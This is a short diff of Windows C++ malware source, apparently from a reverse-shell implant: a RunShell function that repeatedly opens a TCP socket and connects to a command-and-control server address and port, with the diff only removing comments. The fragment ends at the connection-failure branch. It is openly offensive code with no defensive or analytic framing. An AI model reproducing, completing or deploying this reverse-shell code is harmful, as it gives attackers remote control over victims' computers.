@@ -6,15 +6,15 @@
 
 void RunShell(char* C2Server, int C2Port) {
     while(true) {
-        Sleep(5000);    // 1000 = One Second
+        Sleep(5000);
         SOCKET mySocket;
         sockaddr_in addr;
         WSADATA version;
         WSAStartup(MAKEWORD(2,2), &version);
         mySocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
         addr.sin_family = AF_INET;
-        addr.sin_addr.s_addr = inet_addr(C2Server);  //IP received from main function
-        addr.sin_port = htons(C2Port);     //Port received from main function
+        addr.sin_addr.s_addr = inet_addr(C2Server);
+        addr.sin_port = htons(C2Port);
         if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
             closesocket(mySocket);
             WSACleanup();
